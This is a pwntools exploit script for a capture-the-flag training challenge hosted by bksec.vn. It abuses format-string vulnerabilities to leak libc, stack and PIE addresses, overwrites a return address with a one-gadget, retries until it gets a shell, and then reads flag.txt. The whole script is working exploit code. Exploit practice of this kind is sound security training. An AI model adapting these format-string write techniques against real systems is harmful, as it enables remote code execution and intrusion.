#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-greetings-from-bksec-f68db401ac81.training.bksec.vn"

# PORT = 6669
# HOST = '0.0.0.0'

elf = context.binary = ELF('./hello_patched', checksec=False)
libc = ELF('./libc/libc.so.6', checksec=False)
ld = ELF('./libc/ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001965
            brva 0x0000000000001A03
            brva 0x00000000000016A5
            brva 0x00000000000017C4
            brva 0x000000000000168F
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        # return remote(HOST, PORT)
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()


def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)


def attempt(p):
    # Leak libc + stack
    sla(b'your name: ', b'%3$p')

    p.recvuntil(b'Hello, ')
    leak = int(p.recvline().strip(), 16)
    libc.address = leak - 0x1149d7

    log.success(f'libc: {hex(libc.address)}')

    # GDB()
    sla(b'friend? (y/n): ', b'y')
    sa(b"friend's name? ", b'%1$p')

    p.recvuntil(b'Hello, ')
    stack = int(p.recvline().strip(), 16)
    log.success(f'stack: {hex(stack)}')

    vuln_rbp = stack + 0x2110
    main_rbp = vuln_rbp + 0x40
    log.info(f'main_rbp: {hex(main_rbp)}')
    log.info(f'vuln_rbp: {hex(vuln_rbp)}')

    # printf+198

    # Overwrite return of printf -> PIE + 0x1655 and PIE leaking

    printf_ret = vuln_rbp+0x8 - 0x50

    sla(b'to us: ', p64(printf_ret).ljust(30, b'B'))
    sla(b'your input: ', f'%{0x55}p%8$hhn'.encode())
    leak = p.recvuntil(b'\x20'*0x47)

    PIE = int(p.recvuntil(b'Say', drop = True), 16) - 0x22bd
    log.success(f'PIE: {hex(PIE)}')

    ctr = PIE + 0x404C

    pl = flat(
        vuln_rbp+0x8,         # 8
        ctr + 3,              # 9
        printf_ret + 0x18,    # 10
        printf_ret + 0x28,    # 11
    )

    sla(b'to us: ', pl[:30])
    sla(b'your input: ', f'%{0x80}c%9$hhn'.encode())

    og = libc.address + 0x50a47

    vuln_rip = vuln_rbp+0x8

    target = vuln_rip

    for i, byte in enumerate(p64(og)[:6]):
        addr = vuln_rip + i

        if addr != target:
            width = addr & 0xff

            assert 1 <= width <= 99

            sla(b'your input: ', f'%{width}c%10$hhn'.encode())
            target = addr

        sla(b'your input: ', f'%{byte or 256}c%8$hhn'.encode())

    sla(b'your input: ', b'%256c%9$hhn')

i = 0
while True:
    p = None
    try:
        log.info(f'Attempt {i}:')
        p = conn()
        attempt(p)
        log.success(f'Success at attempt {i}')
        p.sendline(b'echo "\nPWNED by d1nhdwc"; uname -a; id; cat flag.txt;')
        p.interactive()
        break
    except (EOFError, OSError, Exception) as e:
        log.warning(f'Attempt {i} failed: {e}')
    finally:
        if p is not None:
            p.close()



